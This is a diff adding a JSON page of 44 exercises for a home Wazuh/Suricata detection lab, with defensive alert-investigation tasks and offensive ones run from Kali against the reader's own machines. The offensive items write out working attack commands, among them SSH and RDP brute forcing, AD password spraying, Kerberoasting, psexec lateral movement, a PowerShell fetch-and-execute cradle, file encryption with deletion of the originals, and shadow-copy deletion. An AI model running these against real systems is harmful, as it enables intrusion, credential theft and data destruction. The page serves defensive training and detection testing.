@@ -1,0 +1,178 @@
+{
+  "title": "Exercises",
+  "subtitle": "44 hands-on exercises built for this exact lab, plus a bonus set on reading raw logs and cross-referencing real detections.",
+  "intro": [
+    { "type": "p", "text": "These aren't generic \"try Wazuh\" tutorials — every one of them targets a real capability, a real rule ID, or a real bug documented elsewhere on this site. Half are defensive (read a dashboard, investigate an alert), half are offensive (run a real attack from Kali against your own lab and confirm detection)." },
+    { "type": "callout", "variant": "danger", "title": "The golden rule, no exceptions", "text": "Every exercise here targets only your own machines, on your own authorized network. Never a third party. Never a public IP that isn't yours. For brute-force exercises, always use a disposable test account with a handful of manual attempts — never a real account, never an automated wordlist against anything that matters." }
+  ],
+  "toolSetup": {
+    "title": "One-time tool setup (on the Kali box)",
+    "code": "sudo apt update\n\n# CrackMapExec / NetExec\nsudo apt install -y netexec\n\n# Impacket (Kerberoasting, psexec, etc.)\nsudo apt install -y impacket-scripts\n\n# Atomic Red Team needs PowerShell on Linux\nsudo apt install -y powershell\npwsh -Command \"Install-Module -Name powershell-yaml -Force -Scope CurrentUser\"\npwsh -Command \"IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -getAtomics\"\n\n# BloodHound needs its own infrastructure — see exercise A-8"
+  },
+  "sections": [
+    {
+      "id": "defensive-warmup",
+      "title": "A. Dashboard Warm-up",
+      "kind": "defensive",
+      "items": [
+        { "id": "ex1", "title": "Find the most recent alert from victim-linux", "difficulty": "easy", "time": "5 min", "text": "In Discover or Threat Hunting, find the most recent alert from the victim-linux agent, whatever the rule. Identify rule.id, rule.level, and summarize what rule.description says happened, in one sentence." },
+        { "id": "ex2", "title": "Count critical alerts in the media_isolation group", "difficulty": "easy", "time": "5 min", "text": "How many alerts with rule.level >= 12 and rule.groups:\"media_isolation\" exist in the last 24 hours? If zero, widen to the last 30 days and report the real number, plus the oldest and newest timestamps." },
+        { "id": "ex3", "title": "Which Suricata sensor talks the most?", "difficulty": "easy", "time": "5 min", "text": "Open the network-security dashboard and check the network-alerts-by-sensor panel. Which of the 8 sensors generated the most alerts in the last 30 days? Is that expected, given each machine's usage pattern?" }
+      ]
+    },
+    {
+      "id": "defensive-network",
+      "title": "B. Network Detection (Suricata)",
+      "kind": "defensive",
+      "items": [
+        { "id": "ex4", "title": "Nmap scan against victim-linux", "difficulty": "easy", "time": "10 min", "tools": ["nmap"], "text": "From kali-vm, run nmap -Pn against victim-linux's real IP. Confirm on the network-security dashboard whether the scan appeared, and on which sensor. If it didn't appear anywhere, explain why using the SPAN/loopback lessons from the Wazuh page." },
+        { "id": "ex5", "title": "Simulate a detectable SSH scan", "difficulty": "medium", "time": "15 min", "text": "Generate traffic that triggers the ET SCAN Potential SSH Scan OUTBOUND signature — several quick connection attempts to port 22. Find the alert in Discover and report data.src_ip, data.dest_ip, and rule.firedtimes." },
+        { "id": "ex6", "title": "The same event, seen by two sensors", "difficulty": "medium", "time": "15 min", "text": "Generate traffic between two machines that both run Suricata. Find the two documents generated for the same network event — one from each sensor — and explain why there are two records instead of one, using agent.name and data.flow_id." },
+        { "id": "ex7", "title": "The mystery IP", "difficulty": "easy", "time": "10 min", "text": "In the network-top-source-ips panel, identify an IP that doesn't correspond to any of the 8 known agents. What is it likely to be? Confirm using data.alert.signature." }
+      ]
+    },
+    {
+      "id": "defensive-fim",
+      "title": "C. File Integrity / Ransomware",
+      "kind": "defensive",
+      "items": [
+        { "id": "ex8", "title": "Trigger a simulated ransomware detection", "difficulty": "easy", "time": "10 min", "text": "On victim-linux, create 3–5 test files in /srv/media/ingest, then rename all of them to end in .locked. Confirm rule 100200 fired at level 12." },
+        { "id": "ex9", "title": "Confirm isolation, failover, and forensic report", "difficulty": "medium", "time": "15 min", "text": "After exercise 8, confirm all three legs of the automated response: the isolation trigger in active-responses.log, the failover being logged, and a forensic report existing — with a matching incident_id across all three." },
+        { "id": "ex10", "title": "Restore and confirm reversibility", "difficulty": "easy", "time": "10 min", "text": "Revert the exercise-8 test files to their original state and confirm syscheck no longer reports a discrepancy. In one sentence, explain why testing reversibility matters for every simulation on this page." }
+      ]
+    },
+    {
+      "id": "defensive-auth",
+      "title": "D. Authentication and Privilege",
+      "kind": "defensive",
+      "items": [
+        { "id": "ex11", "title": "Failed SSH login, three times", "difficulty": "easy", "time": "10 min", "text": "Using a disposable test account, attempt SSH login with the wrong password three times. Find the three corresponding alerts and check whether rule.level increased from the first to the third attempt." },
+        { "id": "ex12", "title": "Unusual sudo command and MITRE mapping", "difficulty": "easy", "time": "10 min", "mitre": ["T1548.003"], "text": "Run a command like sudo -u otheruser whoami on a Linux machine. Find the alert (rule 5407) and confirm rule.mitre.id shows T1548.003. Explain what this technique means, in one sentence." }
+      ]
+    },
+    {
+      "id": "defensive-windows",
+      "title": "E. Windows and Active Directory",
+      "kind": "defensive",
+      "items": [
+        { "id": "ex13", "title": "Create an AD user and see if Wazuh noticed", "difficulty": "medium", "time": "15 min", "text": "On win-server-vm, create a new AD user via ADUC or New-ADUser. Look for a corresponding event (typically Event ID 4720). If nothing is found, that's still a valid result — investigate why AD auditing isn't enabled." },
+        { "id": "ex14", "title": "Domain logon with the wrong password", "difficulty": "medium", "time": "10 min", "text": "Using one of the existing domain test users, attempt a logon with the wrong password. Look for a failed-logon event (Event ID 4625) from win-server-vm and report whether it appeared." },
+        { "id": "ex15", "title": "Unusual PowerShell command on win10-vm", "difficulty": "easy", "time": "10 min", "text": "Run an encoded PowerShell command (powershell -enc <base64>). Find the event and identify which field shows the command was Base64-obfuscated." }
+      ]
+    },
+    {
+      "id": "defensive-cve",
+      "title": "F. Vulnerability Management",
+      "kind": "defensive",
+      "items": [
+        { "id": "ex16", "title": "Triage a CVE from scratch, the right way", "difficulty": "medium", "time": "20 min", "text": "Pick a Critical/High CVE not yet documented in the CVE Management page. Follow the full flow: read the description, check the vendor tracker, assess whether the component is actually used, decide fix/mitigate/accept, and document it." },
+        { "id": "ex17", "title": "Hunt a false positive from an outdated-version report", "difficulty": "hard", "time": "20 min", "text": "Check whether any listed kernel CVE points to a version different from what uname -r actually shows running — an orphaned kernel, exactly like the CVE-2026-31536 case. If found, restart the agent and confirm resync." }
+      ]
+    },
+    {
+      "id": "defensive-dashboards",
+      "title": "G. Dashboards and Automation",
+      "kind": "defensive",
+      "items": [
+        { "id": "ex18", "title": "Build a new dashboard from scratch", "difficulty": "medium", "time": "30 min", "text": "Pick a focus area without its own dashboard yet — win-server-vm/AD, or PAM/sudo authentication across all machines. Build at least 3 visualizations (a Metric, a Line or Table, a Pie) and a named dashboard." },
+        { "id": "ex19", "title": "Configure a real Alerting monitor", "difficulty": "medium", "time": "20 min", "text": "Create a monitor checking every 5 minutes for more than 3 non-noise network alerts. Configure a level-2 trigger and wire it to a Notifications channel. Re-run exercise 5 and confirm the monitor fires." },
+        { "id": "ex20", "title": "Generate a PDF report of the network dashboard", "difficulty": "easy", "time": "10 min", "text": "Generate a PDF report of the network-security dashboard covering the last 7 days. Confirm the PDF matches what's on screen." }
+      ]
+    },
+    {
+      "id": "defensive-advanced",
+      "title": "H. Multi-Sensor Investigation (Advanced)",
+      "kind": "defensive",
+      "items": [
+        { "id": "ex21", "title": "Reconstruct the timeline of a real incident", "difficulty": "hard", "time": "30 min", "text": "Pick a real network event already generated in this lab. Reconstruct the full timeline: origin machine, which sensors saw it, in what order, and elapsed time between the first and last document." },
+        { "id": "ex22", "title": "Investigate the tuning-rule leak", "difficulty": "hard", "time": "30 min", "text": "Rule 100101 is documented as not catching 100% of the noisy signature it targets. Investigate local_rules.xml, understand the exact condition, and propose a fix that closes the gap." }
+      ]
+    },
+    {
+      "id": "offensive-recon",
+      "title": "I. Advanced Reconnaissance (Nmap)",
+      "kind": "offensive",
+      "items": [
+        { "id": "at1", "title": "Host discovery across the whole subnet", "mitre": ["T1046"], "tools": ["Nmap"], "risk": "low", "code": "nmap -sn 192.168.178.0/24", "text": "Confirm an ICMP/ARP traffic spike from kali-vm across all sensors simultaneously — the signature of a full sweep vs. a single-target scan." },
+        { "id": "at2", "title": "Full TCP port scan (all 65535 ports)", "mitre": ["T1046"], "tools": ["Nmap"], "risk": "low", "code": "nmap -p- -T4 192.168.178.177", "text": "Compare to the standard ~1000-port scan already done — this takes much longer and should generate a larger alert volume. Report how long it took." },
+        { "id": "at3", "title": "Service version and OS detection", "mitre": ["T1592"], "tools": ["Nmap"], "risk": "low", "code": "sudo nmap -sV -O 192.168.178.177", "text": "This scan sends malformed packets on purpose to fingerprint the OS. Check for a signature different from the generic scan alert." },
+        { "id": "at4", "title": "Vulnerability scripting scan (NSE)", "mitre": ["T1595.002"], "tools": ["Nmap"], "risk": "medium", "code": "nmap --script vuln 192.168.178.177", "text": "Nmap's most aggressive scan — actively tests known vulnerabilities. Confirm a visibly higher alert volume, and compare Nmap's own findings against Wazuh's Vulnerability Detection module — they're different data sources and don't always agree." }
+      ]
+    },
+    {
+      "id": "offensive-bruteforce",
+      "title": "J. Credential Brute-Forcing",
+      "kind": "offensive",
+      "items": [
+        { "id": "at5", "title": "SSH brute-force with Hydra", "mitre": ["T1110.001"], "tools": ["Hydra"], "risk": "medium", "code": "echo -e \"pass1\\npass2\\nwrongpass\\n123456\" > /tmp/wordlist.txt\nhydra -l test-account -P /tmp/wordlist.txt ssh://192.168.178.177", "text": "Prep: create a disposable test account beforehand — never use a real one. Find the repeated, rapid-sequence PAM authentication_failed alerts — this pattern differentiates a human mistyping a password from automated tooling." },
+        { "id": "at6", "title": "RDP brute-force against Windows", "mitre": ["T1110.001"], "tools": ["Hydra"], "risk": "medium", "code": "hydra -l test-account -P /tmp/wordlist.txt rdp://192.168.178.129", "text": "Look for repeated failed-logon events (Event ID 4625) on win10-vm, and confirm Suricata also captured the repeated RDP traffic pattern on port 3389." },
+        { "id": "at7", "title": "Password spraying against Active Directory", "mitre": ["T1110.003"], "tools": ["NetExec"], "risk": "high", "code": "netexec smb 192.168.178.163 -u users.txt -p 'CommonPass123' --continue-on-success", "text": "Unlike brute-force, spraying tries one password against many accounts specifically to avoid lockouts. Check the domain's lockout policy first (net accounts /domain). Look for repeated 4625 events from the same source against different accounts — the pattern that distinguishes spraying from brute-force." }
+      ]
+    },
+    {
+      "id": "offensive-ad",
+      "title": "K. Active Directory",
+      "kind": "offensive",
+      "items": [
+        { "id": "at8", "title": "User and SMB share enumeration", "mitre": ["T1087.002"], "tools": ["NetExec"], "risk": "low", "code": "netexec smb 192.168.178.163 -u 'test-user' -p 'test-pass' --users\nnetexec smb 192.168.178.163 -u 'test-user' -p 'test-pass' --shares", "text": "Find the SMB traffic (port 445) in Suricata, and if AD auditing is enabled, look for corresponding object-access events." },
+        { "id": "at9", "title": "Kerberoasting — extracting service tickets", "mitre": ["T1558.003"], "tools": ["Impacket"], "risk": "medium", "code": "impacket-GetUserSPNs domain/test-user:test-pass -dc-ip 192.168.178.163 -request", "text": "Only works if a service account with a registered SPN exists — an empty result is a valid outcome. If a ticket returns, look for Event 4769 with a weak encryption type." },
+        { "id": "at10", "title": "Lateral movement via SMB (psexec-style)", "mitre": ["T1021.002"], "tools": ["Impacket"], "risk": "high", "code": "impacket-psexec domain/test-user:test-pass@192.168.178.163", "text": "A real lateral-movement technique via a temporary remote service. Only ever use the test account. Look for service creation (Event ID 7045) right before the remote execution — the classic evidence a SOC analyst looks for." },
+        { "id": "at11", "title": "Map attack paths with BloodHound", "mitre": ["T1482"], "tools": ["BloodHound"], "risk": "low", "code": "sudo apt install -y bloodhound neo4j\nsudo neo4j start\nbloodhound-python -u test-user -p test-pass -d domain.local -ns 192.168.178.163 -c all", "text": "Recon/analysis, not exploitation. Explore the imported graph for any path from a regular user to Domain Admins. \"No obvious path\" is also a valuable, documentable result." }
+      ]
+    },
+    {
+      "id": "offensive-exploitation",
+      "title": "L. Exploitation (Metasploit)",
+      "kind": "offensive",
+      "items": [
+        { "id": "at12", "title": "Auxiliary service-version scanner", "mitre": ["T1592"], "tools": ["Metasploit"], "risk": "low", "code": "msfconsole -q -x \"use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.178.163; run; exit\"", "text": "auxiliary/scanner/* modules are recon, not exploitation — the safe starting point before any real exploit. Confirm the traffic appeared in the target's Suricata." },
+        { "id": "at13", "title": "Exploit a CVE you've already identified yourself", "mitre": ["T1190"], "tools": ["Metasploit"], "risk": "high", "text": "Search your own Vulnerability Detection findings for a documented CVE with a real Metasploit module (search cve:YEAR-NUMBER). Snapshot the VM first. If none found exploitable, that's the expected — and worth documenting — result in most cases." }
+      ]
+    },
+    {
+      "id": "offensive-lolbins",
+      "title": "M. Living off the Land (Windows)",
+      "kind": "offensive",
+      "items": [
+        { "id": "at14", "title": "certutil as a disguised downloader/decoder", "mitre": ["T1140"], "risk": "low", "code": "certutil -encode file.txt file.b64\ncertutil -decode file.b64 out.txt", "text": "Find Sysmon Event ID 1 showing certutil.exe with the -decode parameter — a real pattern attackers use since certutil is a legitimate, Microsoft-signed binary." },
+        { "id": "at15", "title": "PowerShell download cradle", "mitre": ["T1059.001"], "risk": "medium", "code": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://YOUR-SERVER:8000/test.ps1')\"", "text": "The classic \"download cradle\" — fetch and execute in memory without saving to disk. Find the Sysmon event and confirm the full command line is readable, not obfuscated." },
+        { "id": "at16", "title": "Local account discovery via native commands", "mitre": ["T1087.001"], "risk": "low", "code": "net user\nnet localgroup administrators\nwhoami /priv", "text": "Each command looks harmless alone — but the sequence (list users, list admins, check own privileges) is a post-exploitation recon pattern. Explain why sequence matters more than any single command in real triage." }
+      ]
+    },
+    {
+      "id": "offensive-atomic",
+      "title": "N. Atomic Red Team (MITRE ATT&CK)",
+      "kind": "offensive",
+      "items": [
+        { "id": "at17", "title": "T1059.001 — Suspicious PowerShell execution", "mitre": ["T1059.001"], "tools": ["Atomic Red Team"], "risk": "low", "code": "Invoke-AtomicTest T1059.001 -ShowDetailsBrief\nInvoke-AtomicTest T1059.001", "text": "Confirm the resulting Sysmon event and that the MITRE technique field matches what the framework announced." },
+        { "id": "at18", "title": "T1003 — Credential access simulation", "mitre": ["T1003"], "tools": ["Atomic Red Team"], "risk": "medium", "code": "Invoke-AtomicTest T1003", "text": "Simulates the Mimikatz-style behavior pattern (LSASS process access) safely, without extracting real credentials. Verify a process-access event on lsass.exe." },
+        { "id": "at19", "title": "T1547 — Persistence via startup registry key", "mitre": ["T1547.001"], "tools": ["Atomic Red Team"], "risk": "medium", "code": "Invoke-AtomicTest T1547.001\n# always clean up after confirming detection:\nInvoke-AtomicTest T1547.001 -Cleanup", "text": "Find the registry-modification event on the Run/RunOnce key, then confirm -Cleanup actually removed the entry." },
+        { "id": "at20", "title": "T1078 — Valid account use at an unusual time", "mitre": ["T1078"], "risk": "low", "text": "No special tool needed: log into a test domain account outside business hours. Apply the same reasoning as the \"endpoint disappears\" and \"3AM alert\" training cases — unusual timing is an aggravating factor even with valid credentials." }
+      ]
+    },
+    {
+      "id": "offensive-ransomware",
+      "title": "O. Advanced Ransomware",
+      "kind": "offensive",
+      "items": [
+        { "id": "at21", "title": "Real encryption of test files", "mitre": ["T1486"], "tools": ["OpenSSL"], "risk": "medium", "code": "tar -czf ~/backup-pre-test.tar.gz -C /srv/media/ingest .\nfor f in /srv/media/ingest/test-*.txt; do\n  openssl enc -aes-256-cbc -salt -in \"$f\" -out \"$f.enc\" -k \"test-key\"\n  sudo rm \"$f\"\ndone", "text": "Unlike a simple rename, this actually renders the content unreadable — closer to real ransomware behavior. Confirm rule 100200 fires for both the delete and the new .enc file, and that Active Response isolates the node normally." },
+        { "id": "at22", "title": "Shadow copy deletion (anti-recovery)", "mitre": ["T1490"], "tools": ["vssadmin"], "risk": "high", "code": "vssadmin delete shadows /all /quiet", "text": "Snapshot the VM before running this — there is no undo. This is literally what real ransomware families run to prevent recovery. On its own, with no other context, this command should already be treated as a critical indicator. Does your environment have a specific rule for it? If not, that's a real gap to document." }
+      ]
+    },
+    {
+      "id": "bonus-realworld",
+      "title": "P. Reading Real Logs & Cross-Referencing Detections (bonus)",
+      "kind": "bonus",
+      "intro": "Beyond the 44 structured exercises above: the skill that actually separates a junior analyst from a senior one is reading raw data directly, without waiting for a dashboard to summarize it — and confirming that different tools looking at the same event actually agree.",
+      "items": [
+        { "id": "log1", "title": "Read a raw Suricata eve.json line, no dashboard", "difficulty": "medium", "time": "15 min", "text": "SSH into a machine running Suricata and tail -f /var/log/suricata/eve.json (or the platform-equivalent path) while generating traffic from another machine. Identify the alert.signature, src_ip, dest_ip and flow_id fields directly in the raw JSON, before it ever reaches Wazuh's index." },
+        { "id": "log2", "title": "Correlate a real external scan against your public IP", "difficulty": "hard", "time": "20 min", "text": "This lab had a genuine (not simulated) ET SCAN Potential SSH Scan OUTBOUND alert fire from kali-vm during testing, with firedtimes climbing past 180 in a few minutes and zero response from the destination. Reproduce a similar investigation: find a real outbound scan alert in your own environment, and determine from bytes_toclient (or its absence) whether the target actually responded — a genuine security-posture signal, not just a scan record." },
+        { "id": "log3", "title": "Reconstruct an event from full_log alone", "difficulty": "medium", "time": "15 min", "text": "Pick any alert and ignore every structured field except full_log. Reconstruct, in plain English, exactly what happened using only the raw log line — the skill needed for the (common, real) case where a log format has no dedicated decoder yet." },
+        { "id": "log4", "title": "Build a 24-hour \"quiet baseline\"", "difficulty": "medium", "time": "30 min (spread over a day)", "text": "Pick one agent and record, hour by hour, what a completely normal day of alerts looks like: volume, top signatures, typical rule levels. This baseline is what makes an actual anomaly recognizable later — without it, every alert looks equally suspicious." },
+        { "id": "log5", "title": "Compare a scanning tool's own output against what got detected", "difficulty": "medium", "time": "15 min", "text": "Run any scan from this page with verbose/output-file options (e.g. nmap -oA), then compare the tool's own report of what it did against what Wazuh/Suricata actually logged. Are they identical? If Wazuh saw fewer events than the tool actually sent, that's a real detection-coverage gap worth understanding, not just a mismatch to ignore." },
+        { "id": "log6", "title": "Read auditd logs directly with ausearch", "difficulty": "medium", "time": "15 min", "text": "On a Linux endpoint, trigger an auditd rule (e.g. edit /etc/passwd, or attempt a privileged command) and read the result with ausearch -k <key> directly on the host, before it's parsed by Wazuh's decoder. Compare the raw audit fields to what ends up in the Wazuh alert — what gets kept, and what gets dropped?" },
+        { "id": "log7", "title": "Trace one incident across three tools", "difficulty": "hard", "time": "30 min", "text": "Pick a level 7+ alert. Find it in three places: the raw Wazuh alert (Discover), the TheHive alert it generated automatically, and — if you promote it — the resulting case. Confirm the incident tells the exact same story in all three, and note anything that got lost or changed in translation between them." }
+      ]
+    }
+  ]
+}
